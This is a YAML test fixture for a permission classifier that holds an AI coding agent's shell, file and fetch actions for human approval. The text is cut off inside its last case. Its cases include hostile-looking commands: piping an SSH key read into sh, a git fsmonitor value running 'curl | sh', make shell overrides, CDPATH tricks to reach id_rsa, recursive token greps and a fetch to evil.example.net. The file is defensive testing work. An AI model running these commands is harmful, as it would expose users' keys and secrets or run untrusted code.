# Actions that must pause for human approval.
# Evaluation context: home=/Users/me, project=/p, cwd=/p.

- id: ask-npm-install
  threat: T5
  action: { shell: "npm install left-pad-pro" }
  expect: { verdict: ask, rules: [installs] }
- id: ask-pip-install
  threat: T5
  action: { shell: "pip install requests==2.32.0" }
  expect: { verdict: ask, rules: [installs] }
- id: ask-git-push
  threat: T4
  action: { shell: "git push origin HEAD" }
  expect: { verdict: ask, rules: [push] }
- id: ask-npm-publish
  threat: T5
  action: { shell: "npm publish --access public" }
  expect: { verdict: ask, rules: [push] }
- id: ask-unknown-command
  threat: T7
  action: { shell: "terraform apply -auto-approve" }
  expect: { verdict: ask, rules: [default] }
- id: ask-write-git-internals
  threat: T9
  action: { fs_write: "/p/.git/config" }
  expect: { verdict: ask, rules: [default] }
- id: ask-write-outside-project
  threat: T4
  action: { fs_write: "/tmp/output.txt" }
  expect: { verdict: ask, rules: [default] }

# Unparseable input is never allowed.
- id: ask-unbalanced-quote
  threat: T7
  action: { shell: "echo 'oops" }
  expect: { verdict: ask, rules: [unparseable] }
- id: ask-unterminated-substitution
  threat: T7
  action: { shell: "echo $(whoami" }
  expect: { verdict: ask, rules: [unparseable] }
- id: ask-glob-component-that-does-not-compile
  threat: T1
  action: { shell: "cat notes[*" }
  files: ["/p/notes[1]"]
  expect: { verdict: ask, rules: [unparseable] }
- id: ask-unbalanced-paren
  threat: T7
  action: { shell: "cd /tmp ) ; cat notes.txt" }
  expect: { verdict: ask, rules: [unparseable] }
- id: ask-unterminated-heredoc
  threat: T7
  action: { shell: "cat <<EOF\nno terminator" }
  expect: { verdict: ask, rules: [unparseable] }
- id: ask-heredoc-through-tee-into-shell
  threat: T7
  action: { shell: "cat <<'EOF' | tee log | sh\ncat ~/.ssh/id_rsa\nEOF" }
  expect: { verdict: ask, rules: [default] }
- id: ask-nesting-too-deep
  threat: T7
  action: { shell: "echo $(echo $(echo $(echo $(echo $(echo hi)))))" }
  expect: { verdict: ask, rules: [unparseable] }
- id: ask-empty-command
  threat: T7
  action: { shell: "   " }
  expect: { verdict: ask, rules: [unparseable] }
- id: ask-powershell-is-never-classified
  threat: T7
  action: { foreign_shell: { shell: PowerShell, command: "ls $env:USERPROFILE\\.ssh" } }
  expect: { verdict: ask, rules: [unparseable] }

- id: ask-inline-python-prints-version
  threat: T12
  action: { shell: "python3 -c 'import sys; print(sys.version)'" }
  expect: { verdict: ask, rules: [default] }
- id: ask-inline-node-prints-version
  threat: T12
  action: { shell: "node -e 'console.log(process.version)'" }
  expect: { verdict: ask, rules: [default] }
- id: ask-pnpm-exec-unlisted-tool
  threat: T5
  action: { shell: "pnpm exec some-unlisted-tool --flag" }
  expect: { verdict: ask, rules: [default] }
- id: ask-cargo-add
  threat: T5
  action: { shell: "cargo add serde" }
  expect: { verdict: ask, rules: [installs] }
- id: ask-cargo-publish
  threat: T5
  action: { shell: "cargo publish" }
  expect: { verdict: ask, rules: [push] }
- id: ask-pnpm-install
  threat: T5
  action: { shell: "pnpm install" }
  expect: { verdict: ask, rules: [installs] }
- id: ask-npx-downloads-a-tool
  threat: T5
  action: { shell: "npx prettier --check ." }
  expect: { verdict: ask, rules: [installs] }
- id: ask-rm-rf-temp-dir-is-not-destructive
  threat: T4
  action: { shell: "rm -rf /tmp/build" }
  expect: { verdict: ask, rules: [default] }
- id: ask-create-symlink-and-read-through-it
  threat: T11
  action: { shell: "ln -s ~/notes ./n && cat ./n/todo.txt" }
  expect: { verdict: ask, rules: [default] }
# The resolved spelling of a linked project keeps its exclusions, and a link
# inside it to a place outside still asks
- id: ask-linked-project-write-git-internals-resolved
  threat: T9
  context: { cwd: /tmp/app, project: /tmp/app, real_project: /private/tmp/app }
  action: { fs_write: "/private/tmp/app/.git/config" }
  expect: { verdict: ask, rules: [default] }
- id: ask-linked-project-read-through-link-outside
  threat: T11
  context: { cwd: /tmp/app, project: /tmp/app, real_project: /private/tmp/app }
  action: { shell: "cat e/hosts" }
  links: { /tmp/app/e: /etc }
  expect: { verdict: ask, rules: [default] }
# A moved Claude Code directory is protected where the default one is, no
# wider: its other files ask as they would under ~/.claude
- id: ask-moved-claude-dir-other-file
  threat: T9
  context: { cwd: /p, project: /p, moved_dirs: { "~/.claude": /srv/claude } }
  action: { fs_write: "/srv/claude/CLAUDE.md" }
  expect: { verdict: ask, rules: [default] }
# T3: env with arguments sets variables for one command; it is not a dump
- id: ask-env-assignment-wrapper-is-not-a-dump
  threat: T3
  action: { shell: "env FOO=1 git status" }
  expect: { verdict: ask, rules: [default] }
- id: ask-printenv-one-ordinary-variable
  threat: T3
  action: { shell: "printenv HOME" }
  expect: { verdict: ask, rules: [default] }
- id: ask-set-shell-options-is-not-a-dump
  threat: T3
  action: { shell: "set -euo pipefail" }
  expect: { verdict: ask, rules: [default] }
# T7: make arguments that replace the recipe shell or inject makefile text ask
- id: ask-make-shell-override-after-target
  threat: T7
  action: { shell: "make test SHELL=/tmp/evil" }
  expect: { verdict: ask, rules: [default] }
- id: ask-make-shell-override-before-target
  threat: T7
  action: { shell: "make SHELL=/tmp/evil test" }
  expect: { verdict: ask, rules: [default] }
- id: ask-make-shellflags-override
  threat: T7
  action: { shell: "make test .SHELLFLAGS=-ec" }
  expect: { verdict: ask, rules: [default] }
- id: ask-make-environment-overrides
  threat: T7
  action: { shell: "make test -e" }
  expect: { verdict: ask, rules: [default] }
- id: ask-make-eval-harmless-text
  threat: T7
  action: { shell: "make test -E 'x:;id'" }
  expect: { verdict: ask, rules: [default] }
- id: ask-make-file-outside-project
  threat: T7
  action: { shell: "make test --file=/tmp/evil.mk" }
  expect: { verdict: ask, rules: [default] }
# T7: decoding without an interpreter on the receiving end is not pipe-to-shell
- id: ask-base64-decode-to-file
  threat: T7
  action: { shell: "base64 -d file > out" }
  expect: { verdict: ask, rules: [default] }
- id: ask-gunzip-into-tar
  threat: T7
  action: { shell: "gunzip -c x.gz | tar x" }
  expect: { verdict: ask, rules: [default] }
- id: ask-decoded-stdin-to-shell-running-a-script
  threat: T7
  action: { shell: "base64 -d f | bash build.sh" }
  expect: { verdict: ask, rules: [default] }
# T9: recording an ordinary command with script is not kernel-self
- id: ask-script-recording-ordinary-command
  threat: T9
  action: { shell: "script -q build.log make test" }
  expect: { verdict: ask, rules: [default] }
# T7: options that run another program or write files are excluded from dev-shell
- id: ask-find-exec-ordinary-command
  threat: T7
  action: { shell: "find . -name '*.tmp' -exec rm {} \\;" }
  expect: { verdict: ask, rules: [default] }
- id: ask-find-delete
  threat: T7
  action: { shell: "find . -delete" }
  expect: { verdict: ask, rules: [default] }
- id: ask-rg-preprocessor
  threat: T7
  action: { shell: "rg --pre=sh TODO" }
  expect: { verdict: ask, rules: [default] }
- id: ask-git-fetch-upload-pack
  threat: T7
  action: { shell: "git fetch --upload-pack='touch /tmp/pwn' origin" }
  expect: { verdict: ask, rules: [default] }
- id: ask-git-log-output-outside-project
  threat: T7
  action: { shell: "git log --output=/tmp/log.txt" }
  expect: { verdict: ask, rules: [default] }
- id: ask-go-test-exec-wrapper
  threat: T7
  action: { shell: "go test -exec /tmp/x ./..." }
  expect: { verdict: ask, rules: [default] }
- id: ask-cargo-config-override
  threat: T7
  action: { shell: "cargo test --config 'build.rustc-wrapper=\"/tmp/x\"'" }
  expect: { verdict: ask, rules: [default] }
# Inspection that can run code, write, or mutate stays outside dev-readonly
- id: ask-sed-script-can-execute
  threat: T7
  action: { shell: "sed -n '1e id' src/main.rs" }
  expect: { verdict: ask, rules: [default] }
- id: ask-gh-api-can-write
  threat: T12
  action: { shell: "gh api repos/x/y -X DELETE" }
  expect: { verdict: ask, rules: [default] }
- id: ask-docker-run
  threat: T5
  action: { shell: "docker run --rm alpine" }
  expect: { verdict: ask, rules: [default] }
- id: ask-gh-run-view-writes-output-file
  threat: T4
  action: { shell: "gh run view 3 --log -o out.txt" }
  expect: { verdict: ask, rules: [default] }
# A patch that names no file cannot be checked
- id: ask-patch-without-files
  threat: T7
  action: { patch: [] }
  expect: { verdict: ask, rules: [unparseable] }
# T12: local services ask rather than being denied as unknown hosts
- id: ask-curl-localhost-dev-server
  threat: T12
  action: { shell: "curl http://localhost:3000/health" }
  expect: { verdict: ask, rules: [local-net] }
- id: ask-curl-ipv6-loopback
  threat: T12
  action: { shell: "curl http://[::1]:8080/" }
  expect: { verdict: ask, rules: [local-net] }
# T7: a shell's options are parsed, not guessed; the inner command is evaluated on its own
- id: ask-bash-login-c-ordinary-command
  threat: T7
  action: { shell: "bash -lc 'cargo test'" }
  expect: { verdict: ask, rules: [default] }
- id: ask-shell-option-unknown
  threat: T7
  action: { shell: "bash --frobnicate -c 'cargo test'" }
  expect: { verdict: ask, rules: [unparseable] }
- id: ask-sh-bash-only-long-option
  threat: T7
  action: { shell: "sh --rcfile rc -c 'cargo test'" }
  expect: { verdict: ask, rules: [unparseable] }
- id: ask-bash-option-value-is-not-a-script
  threat: T7
  action: { shell: "bash -o pipefail build.sh" }
  expect: { verdict: ask, rules: [default] }
# T9: pty and terminal tools that do not reach `moat allow|doctor|init|policy` are not kernel-self
- id: ask-python-pty-spawn-ordinary-shell
  threat: T9
  action: { shell: "python3 -c 'import pty; pty.spawn([\"bash\"])'" }
  expect: { verdict: ask, rules: [default] }
- id: ask-tmux-ordinary-command
  threat: T9
  action: { shell: "tmux new -d 'cargo test'" }
  expect: { verdict: ask, rules: [default] }
- id: ask-osascript-mentions-moat
  threat: T9
  action: { shell: "osascript -e 'display notification \"moat build done\"'" }
  expect: { verdict: ask, rules: [default] }
- id: ask-absolute-script-recording-ordinary-command
  threat: T9
  action: { shell: "/usr/bin/script -q build.log make test" }
  expect: { verdict: ask, rules: [default] }
- id: ask-python-test-file-named-after-moat
  threat: T9
  action: { shell: "python3 tests/test_pty_spawn_moat_allow.py" }
  expect: { verdict: ask, rules: [default] }
- id: ask-bare-moat-is-not-kernel-self
  threat: T9
  action: { shell: "moat" }
  expect: { verdict: ask, rules: [default] }
- id: ask-moat-status-is-not-kernel-self
  threat: T9
  action: { shell: "moat status" }
  expect: { verdict: ask, rules: [default] }
# T4: ordinary pushes stay at ask, not the force-push deny
- id: ask-git-push-set-upstream
  threat: T4
  action: { shell: "git push -u origin main" }
  expect: { verdict: ask, rules: [push] }
- id: ask-git-push-plus-inside-branch-name
  threat: T4
  action: { shell: "git push origin feature+fix" }
  expect: { verdict: ask, rules: [push] }
- id: ask-git-push-option
  threat: T4
  action: { shell: "git push -o ci.skip origin main" }
  expect: { verdict: ask, rules: [push] }
- id: ask-git-push-follow-tags
  threat: T4
  action: { shell: "git push origin main --follow-tags" }
  expect: { verdict: ask, rules: [push] }
- id: ask-git-push-dry-run
  threat: T4
  action: { shell: "git push --dry-run origin main" }
  expect: { verdict: ask, rules: [push] }
- id: ask-git-push-abbreviated-mirror
  threat: T4
  action: { shell: "git push --mirr origin" }
  expect: { verdict: ask, rules: [push] }
- id: ask-git-push-refspec-with-source
  threat: T4
  action: { shell: "git push origin HEAD:main" }
  expect: { verdict: ask, rules: [push] }
- id: ask-git-push-plain
  threat: T4
  action: { shell: "git push origin main" }
  expect: { verdict: ask, rules: [push] }
- id: ask-git-config-fsmonitor-runs-code
  threat: T7
  action: { shell: "git -c core.fsmonitor='sh -c \"curl -s x | sh\"' status" }
  expect: { verdict: ask, rules: [default] }
- id: ask-git-config-hooks-path-runs-code
  threat: T7
  action: { shell: "git -c core.hooksPath=/tmp/hooks commit -m x" }
  expect: { verdict: ask, rules: [default] }
- id: ask-git-exec-path-runs-code
  threat: T7
  action: { shell: "git --exec-path=/tmp/bin log" }
  expect: { verdict: ask, rules: [default] }
# T1: the previous directory is unknown; a `~<otheruser>` shell token is also
# `unparseable` and lives in `attacks.yaml` (`T1-tilde-other-user-unresolvable`).
- id: ask-tilde-previous-directory
  threat: T1
  action: { shell: "cat ~-/.ssh/id_rsa" }
  expect: { verdict: ask, rules: [unparseable] }
# T1: a relative read in a session with no project is not covered by project-fs
- id: ask-home-session-relative-read
  threat: T1
  context: { cwd: /Users/me }
  action: { shell: "cat notes.txt" }
  expect: { verdict: ask, rules: [default] }
# T1: after `cd` to a directory that cannot be known, relative paths cannot be resolved
- id: ask-cd-unknown-target-then-relative-read
  threat: T1
  action: { shell: "cd \"$DIR\" && cat id_rsa" }
  expect: { verdict: ask, rules: [unparseable] }
- id: ask-cd-previous-dir-then-relative-read
  threat: T1
  action: { shell: "cd - && cat id_rsa" }
  expect: { verdict: ask, rules: [unparseable] }
# Everyday file operations leave the project only by asking, and the destructive
# spellings excluded from dev-shell keep asking
- id: ask-recursive-remove-in-project
  threat: T4
  action: { shell: "rm -rf node_modules" }
  expect: { verdict: ask, rules: [default] }
- id: ask-recursive-remove-capital-r
  threat: T4
  action: { shell: "rm -Rf dist" }
  expect: { verdict: ask, rules: [default] }
# a directory below the home is not the home: these stay at ask, not destructive
- id: ask-recursive-remove-below-home
  threat: T4
  action: { shell: "rm -rf ~/tmp/build" }
  expect: { verdict: ask, rules: [default] }
- id: ask-recursive-remove-file-named-like-home
  threat: T4
  action: { shell: "rm -r ./~" }
  expect: { verdict: ask, rules: [default] }
- id: ask-mkdir-below-home
  threat: T4
  action: { shell: "mkdir ~/x" }
  expect: { verdict: ask, rules: [default] }
- id: ask-file-tool-write-below-home
  threat: T4
  action: { fs_write: "/Users/me/notes.txt" }
  expect: { verdict: ask, rules: [default] }
- id: ask-checkout-discards-changes
  threat: T4
  action: { shell: "git checkout -- ." }
  expect: { verdict: ask, rules: [default] }
- id: ask-checkout-dot-discards-changes
  threat: T4
  action: { shell: "git checkout ." }
  expect: { verdict: ask, rules: [default] }
- id: ask-force-checkout
  threat: T4
  action: { shell: "git checkout -f main" }
  expect: { verdict: ask, rules: [default] }
- id: ask-mkdir-outside-project
  threat: T9
  action: { shell: "mkdir -p ~/scratch" }
  expect: { verdict: ask, rules: [default] }
- id: ask-copy-out-of-project
  threat: T1
  action: { shell: "cp src/main.rs /tmp/main.rs" }
  expect: { verdict: ask, rules: [default] }
# into a directory, a copy or move writes the entry named after the source
# (`~/f`), not the directory itself, which `destructive` denies
- id: ask-copy-into-home-directory
  threat: T1
  action: { shell: "cp notes.txt ~/" }
  expect: { verdict: ask, rules: [default] }
- id: ask-move-into-home-directory
  threat: T1
  action: { shell: "mv build/report.html ~" }
  expect: { verdict: ask, rules: [default] }
- id: ask-copy-into-home-with-target-directory
  threat: T1
  action: { shell: "cp -t ~ notes.txt" }
  expect: { verdict: ask, rules: [default] }
- id: ask-rsync-directory-into-home
  threat: T1
  action: { shell: "rsync -a dist ~/" }
  expect: { verdict: ask, rules: [default] }
- id: ask-copy-directory-into-root
  threat: T4
  action: { shell: "cp -r assets /" }
  expect: { verdict: ask, rules: [default] }
- id: ask-cd-home-then-list
  threat: T1
  action: { shell: "cd ~ && ls" }
  expect: { verdict: ask, rules: [default] }

# ADR-017 a host fetch tool reading an unlisted URL asks instead of being denied
- id: ask-webfetch-docs
  threat: T12
  action: { fetch: "https://docs.rs/serde/latest/serde/" }
  expect: { verdict: ask, rules: [default.fetch] }
- id: ask-webfetch-unknown-host
  threat: T12
  action: { fetch: "https://evil.example.net/x?q=1" }
  expect: { verdict: ask, rules: [default.fetch] }
- id: ask-webfetch-localhost
  threat: T12
  action: { fetch: "http://localhost:3000/health" }
  expect: { verdict: ask, rules: [local-net] }
# T6 a `CDPATH` set on the line can send a relative `cd` elsewhere; the classifier cannot follow it
- id: ask-cdpath-set-before-cd
  threat: T6
  action: { shell: "CDPATH=~ cd .ssh && cat id_rsa" }
  expect: { verdict: ask, rules: [default] }
- id: ask-cdpath-exported-before-cd
  threat: T6
  action: { shell: "export CDPATH=~; cd .ssh && cat id_rsa" }
  expect: { verdict: ask, rules: [default] }
# T1 a recursive read of an ancestor of secret directories (`~`, `~/.config`) is checked on
# the directory itself: no deny rule names it, and no allow rule covers it outside a project
- id: ask-recursive-read-grep-home
  threat: T1
  action: { shell: "grep -r . ~" }
  expect: { verdict: ask, rules: [default] }
- id: ask-recursive-read-rg-home
  threat: T1
  action: { shell: "rg -uu . ~" }
  expect: { verdict: ask, rules: [default] }
- id: ask-recursive-read-grep-config
  threat: T1
  action: { shell: "grep -r token ~/.config" }
  expect: { verdict: ask, rules: [default] }
- id: ask-recursive-read-rg-config
  threat: T1
  action: { shell: "rg secret ~/.config" }
  expect: { verdict: ask, rules: [default] }
- id: ask-recursive-read-find-home
  threat: T1
  action: { shell: "find ~ -name '*.pem'" }
  expect: { verdict: ask, rules: [default] }
- id: ask-recursive-read-tar-home
  threat: T1
  action: { shell: "tar czf h.tgz ~" }
  expect: { verdict: ask, rules: [default] }
- id: ask-recursive-read-cp-home
  threat: T1
  action: { shell: "cp -r ~ /tmp/h" }
  expect: { verdict: ask, rules: [default] }
- id: ask-recursive-read-zip-home
  threat: T1
  action: { shell: "zip -r h.zip ~" }
  expect: { verdict: ask, rules: [default] }
- id: ask-recursive-read-rsync-home
  threat: T1
  action: { shell: "rsync -a ~ /tmp/h" }
  expect: { verdict: ask, rules: [default] }
- id: ask-recursive-read-grep-cwd-home
  threat: T1
  action: { shell: "grep -r token ." }
  context: { cwd: /Users/me }
  expect: { verdict: ask, rules: [default] }
- id: ask-recursive-read-grep-parent-of-project
  threat: T1
  action: { shell: "grep -r . .." }
  context: { cwd: /Users/me/proj, project: /Users/me/proj }
